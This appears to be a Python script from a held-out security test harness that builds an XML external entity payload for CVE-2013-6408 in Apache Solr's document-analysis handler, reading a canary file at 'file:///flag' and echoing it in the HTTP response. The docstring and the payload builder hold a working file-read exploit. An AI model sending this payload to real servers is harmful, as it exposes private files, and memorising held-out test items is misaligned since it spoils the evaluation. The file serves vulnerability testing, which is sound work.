#!/usr/bin/env python3
"""[HELD-OUT] CVE-2013-6408 residual for apache-solr-cve-2013-6408 -- REAL SERVER, EXTERNAL HTTP.

CVE-2013-6407's fix (SOLR-3895) hardened the XML UpdateRequestHandler's parser (XMLLoader) by
calling EmptyEntityResolver.configureXMLInputFactory on its XMLInputFactory -- but it was
"overlooked while committing SOLR-3895" (SOLR-4881) that a SECOND handler,
org.apache.solr.handler.DocumentAnalysisRequestHandler, builds its OWN XMLInputFactory in init()
and NEVER applied the same guard. So the attacker moves the SAME XXE document to that handler's real
HTTP endpoint (the document-analysis request handler, /solr/collection1/analysis/document), whose
parser still resolves external entities on the CVE-2013-6407-patched build. The referenced entity is
placed in the string uniqueKey field `id`; the analysis handler echoes the (un-tokenized) field value
back in its HTTP response, surfacing the resolved file contents:

    <?xml version="1.0"?>
    <!DOCTYPE docs [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
    <docs><doc><field name="id">&xxe;</field></doc></docs>

Same XXE sink CLASS (a Solr handler's XMLInputFactory StAX parse over external HTTP) and same
read-exfil channel as the seed; the residual only changes WHICH handler's factory parses it. On V1
(Solr 4.1.0) DocumentAnalysisRequestHandler.init() sets only "reuse-instance" (no EmptyEntityResolver),
so &xxe; expands to the file content and the flag is surfaced in the HTTP response (REACHES on V1). On
V2 (Solr 4.3.1, CVE-2013-6408 / SOLR-4881 patched) init() now calls
EmptyEntityResolver.configureXMLInputFactory(inputFactory) -> external entity closed -> no flag (BLOCKED).
"""

# Same read-exfil canary file as the seed, planted OUTSIDE the app dir (see entrypoint.sh).
CANARY_FILE = "file:///flag"

# One residual vector: re-route the identical XXE document to the un-hardened handler's HTTP endpoint.
VECTORS = [
    {"id": "cve-2013-6408-documentanalysis-xxe", "handler": "docanalysis"},
]


def _mk(vec_id, handler):
    return {
        "id": vec_id,
        "handler": handler,  # -> POST /solr/collection1/analysis/document (DocumentAnalysisRequestHandler)
        "payload": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE docs [ <!ENTITY xxe SYSTEM "' + CANARY_FILE + '"> ]>'
            '<docs><doc><field name="id">&xxe;</field></doc></docs>'
        ),
    }


def candidate(vec):
    return _mk(vec["id"], vec["handler"])


if __name__ == "__main__":
    import json
    print(json.dumps([candidate(v) for v in VECTORS], indent=2))
